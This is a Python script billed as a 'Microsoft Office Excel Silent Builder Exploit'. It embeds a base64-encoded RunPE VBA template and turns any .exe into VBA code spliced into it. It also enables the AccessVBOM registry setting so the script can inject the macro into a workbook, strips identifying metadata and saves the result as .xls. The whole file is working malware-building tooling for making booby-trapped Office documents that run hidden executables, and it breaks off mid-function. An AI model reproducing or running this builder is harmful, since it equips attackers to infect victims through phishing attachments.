from csv import excel
import os, sys
from winreg import *
import itertools
from contextlib import contextmanager
from win32api import GetFileVersionInfo, LOWORD, HIWORD
from os import path
import platform
import os.path
import zipfile
import base64
import os.path
import time
from random import randrange

lib_bs64 = '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'

if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
    decoded = base64.b64decode(lib_bs64) 
    filename = 'lib.zip' 
    with open(filename, 'wb') as f: 
       f.write(decoded) 
           
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

zip_file = "lib.zip"
 
try:
    with zipfile.ZipFile(zip_file) as z:
        z.extractall()
        print("\033[1;77m[+] Extracted all \033[0m")
except:
    print("Already installed")

file_exists = os.path.exists('RunPE.vba')

if file_exists == False:
  print("RunPE.vba not found")
  sys.exit()

# Conveting file

format_number =  {'.xlsm': 52,'.xls': 56}

def is_xls_xml(infile):
    if os.path.splitext(infile)[1].lower()=='.xml':
        with open(infile, "r") as f:
            lines = f.read(65536).split("\n")[0:5]
            if (len(lines)>3 and
                lines[0].strip()=='<?xml version="1.0"?>' and
                    lines[1].strip()=='<?mso-application progid="Excel.Sheet"?>'):
                return True
    return False


def excel_convert(infile, out_ext):
    import win32com.client

    if out_ext not in format_number:
        raise ValueError("Unknown extension '{}': valid extensions: {}".format(out_ext, format_number.keys()))

    infile_fullpath = os.path.abspath(infile)
    (base, in_ext) = os.path.splitext(infile_fullpath)

    wb = None
    if not os.path.isfile(infile_fullpath):
        raise FileNotFoundError(infile_fullpath)

    outfile    = base +out_ext
    if os.path.exists(outfile):
        raise FileExistsError(outfile)

    if in_ext==out_ext:
        raise ValueError(f"Input extension {in_ext} matches output extension {out_ext}")

    if in_ext.lower()=='.xml' and not is_xls_xml(infile_fullpath):
        raise RuntimeError(f"{in_ext} is not an XLS XML file")

    excel = win32com.client.DispatchEx("Excel.Application")
    excel.Visible = 0
    excel.DisplayAlerts = False

    print("Opening {}".format(infile_fullpath))
    wb = excel.Workbooks.Open(infile_fullpath)

    if out_ext == '.pdf':
        for ws in wb.Worksheets:
            ws.Activate()                       
            excel.ActiveSheet.Columns.AutoFit()

            excel.PrintCommunication    = False

            ws.PageSetup.LeftMargin = 36
            ws.PageSetup.RightMargin = 36
            ws.PageSetup.TopMargin = 36
            ws.PageSetup.BottomMargin = 36

            ws.PageSetup.FitToPagesWide = 1

            excel.PrintCommunication    = True

    print("{} => {}".format(infile_fullpath, outfile))

    wb.Worksheets.Select()
    wb.SaveAs(outfile, FileFormat=format_number[out_ext])
    wb.Close(False)         
    excel.Quit()
    return True

# Main Processing
def enableVbomExcel():
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  
    version = objExcel.Application.Version
    objExcel.Application.Quit()
    del objExcel

    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[+] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  
    winreg.CloseKey(Registrykey)

def disableVbomExcel():
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  
    version = objExcel.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[+] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0) 
    winreg.CloseKey(Registrykey)

def excelMacro(filepath,macro_path):
    enableVbomExcel()

    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    
    pathToExcelFile = path + '\\' + filepath
    pathToMacro = path + '\\' + macro_path

    with open(pathToMacro, "r") as myfile:
        print('\033[1;77m[+] Reading macro into string from: \033[0m' + str(myfile))
        macro = myfile.read()

    print("\033[1;77mPlease waiting... \033[0m")         

    excel = win32com.client.Dispatch("Excel.Application")

    excel.Visible = False

    workbook = excel.Workbooks.Open(Filename=pathToExcelFile)

    excelModule = workbook.VBProject.VBComponents.Add(1)
    excelModule.CodeModule.AddFromString(macro)

    print("\033[1;77m[+] Remove hidden data and personal info...\033[0m")
    xlRDIAll = 99
    workbook.RemoveDocumentInformation(xlRDIAll)
    excel.Workbooks(1).Close(SaveChanges=1)
    excel.Application.Quit()
    del excel

    disableVbomExcel()

    print("\033[1;77m[+] File is finalizing...\033[0m")

    excel_convert(pathToExcelFile,".xls")

    print("\033[1;77m[+] Process successfully completed \033[0m")
    
    os.remove("lib.zip")
    os.remove("RunPE.vba")

# PE to VBA Converting

MAX_PROC_SIZE = 50 
MAX_LINE_SIZE = 50 
TAG_PE2VBA_BEGIN = "' ===== BEGIN PE2VBA ====="
TAG_PE2VBA_END = "' ===== END PE2VBA ====="

def is_printable(c):
 
  if c >= 0x20 and c < 0x7F and c != 0x22:
    return True
  else:
    return False

def pe_to_vba(pe):
  block = "" 
  line = ""
  ba = bytearray(pe)
  
  blocks = []
  cnt_bytes_current_line = 0
  cnt_lines_current_block = 0
  cnt_bytes_total = 0 
  prev_char_was_printable = False
  
  for b in ba:
  
    if cnt_lines_current_block == 0:
      
      block = "    strPE = \"\"\n"   
      cnt_lines_current_block += 1 
    if cnt_bytes_current_line == 0:
      
      line = "strPE"
    
    if is_printable(b):
      if prev_char_was_printable:
        line += chr(b)
      else:
        line = "B(%s, \"%s" % (line, chr(b))
      prev_char_was_printable = True
    else:
      if prev_char_was_printable:
        line += "\")"
      line = "A(%s, %s)" % (line, str(b))
      prev_char_was_printable = False
    
    cnt_bytes_current_line += 1 
    cnt_bytes_total += 1 

   
    if cnt_bytes_current_line == MAX_LINE_SIZE or cnt_bytes_total == len(ba):
      if prev_char_was_printable:
        block += "    strPE = %s\")\n" % (line)
      else:
        block += "    strPE = %s\n" % (line)
      prev_char_was_printable = False 
      cnt_bytes_current_line = 0
      cnt_lines_current_block += 1

   
    if cnt_lines_current_block == MAX_PROC_SIZE or cnt_bytes_total == len(ba):
      cnt_lines_current_block = 0 
      cnt_bytes_current_line = 0 
      blocks.append(block) 
  
 
  proc = ""
  for i in range(len(blocks)):
    proc += "Private Function PE" + str(i) + "() As String\n"
    proc += "   Dim strPE As String\n\n"
    proc += blocks[i]
    proc += "\n    PE" + str(i) + " = strPE\n"
    proc += "End Function\n\n"
  
  vba = ""
  vba += proc
  vba += "Private Function PE() As String\n"
  vba += "    Dim strPE As String\n"
  vba += "    strPE = \"\"\n"
  for i in range(len(blocks)):
    vba += "    strPE = strPE + PE" + str(i) + "()\n"
  vba += "    PE = strPE\n" 
  vba += "End Function\n" 
  
  return vba 

def apply_template(pe_as_vba):
  res = ""
  
  tmpl_dir = os.path.dirname(os.path.realpath(__file__))
  tmpl_filepath = os.path.join(tmpl_dir, "RunPE.vba") 
  
  if os.path.isfile(tmpl_filepath):
  
    tmpl_file = open(tmpl_filepath , "r") 
    concat_line = True
    
    for line in tmpl_file:
      cur_line = line.rstrip()
      
      if cur_line == TAG_PE2VBA_END:
        concat_line = True 
        
      if concat_line:
        res += line 
      
      if cur_line == TAG_PE2VBA_BEGIN:  
        concat_line = False 
        res += pe_as_vba 
    
    tmpl_file.close() 
      
  else:
    print("[!] Cannot find file: '%s'" % tmpl_filepath) 
  
  return res


def main():

  print("\033[1;77m--- Microsoft Office Excel Silent Builder Exploit ---\033[0m")
  print("\033[1;77m---------- Author: viper_8080 - 0day.today ----------\033[0m \n")

  pefile = input("\033[1;77mInput filename (.exe): \033[0m")

  pe_file = open(pefile, "rb") 
  pe = pe_file.read() 
  pe_file.close() 
  
  pe_as_vba = pe_to_vba(pe) 
    
  out_file_content = apply_template(pe_as_vba)
  
  macro_name = "%s.vba" % (pefile)
  out_file = open(macro_name , "w") 
  out_file.write(out_file_content) 
  out_file.close()

  if os.path.isfile(macro_name): 
